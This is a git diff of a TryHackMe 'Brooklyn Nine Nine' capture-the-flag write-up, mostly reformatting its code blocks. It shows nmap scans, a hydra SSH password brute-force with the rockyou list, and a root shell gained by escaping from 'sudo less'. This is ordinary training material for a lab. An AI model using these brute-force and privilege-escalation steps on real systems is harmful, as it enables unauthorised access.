@@ -19,23 +19,22 @@ tags:
 # Introduction
 -------------
 
-This writeup documents the penetration testing of the [**Brooklyn Nine Nine**](https://tryhackme.com/room/brooklynninenine) machine from the [**TryHackMe**](https://tryhackme.com/) platform.
-
-In this case I'll enumerate the web service and FTP service to brute-force SSH credentials and privesc with a SUID binary.
+This writeup documents the penetration testing of the [**Brooklyn Nine Nine**](https://tryhackme.com/room/brooklynninenine) machine from the [**TryHackMe**](https://tryhackme.com/) platform. In this case I'll enumerate the web service and FTP service to brute-force SSH credentials and privesc with a SUID binary.
 
 <br>
 # Information Gathering
 ------------------
 
-Once we have discovered the IP of the machine we need to enumerate as much information as possible.
+After identifying the target's IP address, we need to enumerate as  much information as possible about the host.
 
-When we ping a machine that is in our local network, normally:
-* TTL 64: Linux machine.
-* TTL 128: Windows machine.
-We can also use the [**whichSystem**](https://github.com/Akronox/WichSystem.py) script.
+A quick way to get a hint of the OS is checking the TTL value from a simple ping to a host on our local network. The [**whichSystem**](https://github.com/Akronox/WichSystem.py) script can also be used for this purpose.
+* TTL 64: Linux.
+* TTL 128: Windows.
 
-```java
+```bash
 ❯ ping -c 1 10.10.204.88
+```
+```
 PING 10.10.204.88 (10.10.204.88) 56(84) bytes of data.
 64 bytes from 10.10.204.88: icmp_seq=1 ttl=63 time=57.3 ms
 
@@ -44,10 +43,12 @@ PING 10.10.204.88 (10.10.204.88) 56(84) bytes of data.
 rtt min/avg/max/mdev = 57.267/57.267/57.267/0.000 ms
 ```
 
-In this case, it seems to be a Linux machine. Let's do a port scan with nmap.
+In this case, it seems to be a Linux machine. Let's perform some scans.
 
-```java
+```bash
 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.204.88 -oG allPorts
+```
+```
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-02 21:15 CET
 Initiating SYN Stealth Scan at 21:15
@@ -71,10 +72,10 @@ Nmap done: 1 IP address (1 host up) scanned in 19.69 seconds
            Raw packets sent: 97154 (4.275MB) | Rcvd: 58618 (2.345MB)
 ```
 
-Let's perform a deeper scan with the parameter ``-sCV`` over those ports.
-
-```java
+```bash
 ❯ nmap -sCV -p21,22,80 10.10.204.88 -oN targeted
+```
+```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-02 21:16 CET
 Nmap scan report for 10.10.204.88
 Host is up (0.19s latency).
@@ -118,8 +119,10 @@ We are facing an **Ubuntu Bionic**.
 
 We can't do much with the SSH service since we don't have credentials yet, later we'll enumerate the port 21. Now it's time to enumerate the web server running on the port 80:
 
-```
+```bash
 ❯ whatweb http://10.10.204.88
+```
+```
 http://10.10.204.88 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.204.88]
 ```
 
@@ -149,6 +152,8 @@ Jake's password seems to be very weak. We can now try the user jake and brute-fo
 
 ```bash
 ❯ hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.204.88 ssh
+```
+```
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-02 21:33:34
@@ -171,23 +176,37 @@ We got the credentials. Now we have access to the server via SSH.
 
 We need to find a way to escalate privileges. To find ways to do that in Linux I normally use **linpeas**, but I throwed ``sudo -l`` and noticed that I had permissions to execute ``/usr/bin/less`` which is a symbolic link of the binary ``/bin/less``.
 
-```
+```bash
 jake@brookly_nine_nine:~$ sudo -l
+```
+```
 Matching Defaults entries for jake on brookly_nine_nine:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User jake may run the following commands on brookly_nine_nine:
     (ALL) NOPASSWD: /usr/bin/less
+```
+
+```bash
 jake@brookly_nine_nine:~$ ls -l less
+```
+```
 lrwxrwxrwx 1 root root 9 Feb  3  2020 less -> /bin/less
+```
+
+```bash
 jake@brookly_nine_nine:~$ ls -l /bin/less
+```
+```
 -rwsr-xr-x 1 root root 170760 Dec  1  2017 less
 ```
 
 We have permissions to execute this binary as root. So, I went to [**GTFOBins**](https://gtfobins.github.io/gtfobins/less/) and I saw many different ways to spawn a shell with **less**.
 
-```
+```bash
 jake@brookly_nine_nine:~$ sudo less /etc/profile
+```
+```
 WARNING: terminal is not fully functional
 !/bin/shfile  (press RETURN)
 # whoami
@@ -203,6 +222,8 @@ In this case, I got the root flag before the user flag since I had an easy way t
 ```
 # cd /home/holt
 # ls -la
+```
+```
 total 48
 drwxr-xr-x 6 holt holt 4096 May 26  2020 .
 drwxr-xr-x 5 root root 4096 May 18  2020 ..
@@ -216,6 +237,11 @@ drwxrwxr-x 3 holt holt 4096 May 17  2020 .local
 drwx------ 2 holt holt 4096 May 18  2020 .ssh
 -rw------- 1 root root  110 May 18  2020 nano.save
 -rw-rw-r-- 1 holt holt   33 May 17  2020 user.txt
+```
+
+```
 # cat user.txt
+```
+```
 ***REDACTED***
 ```
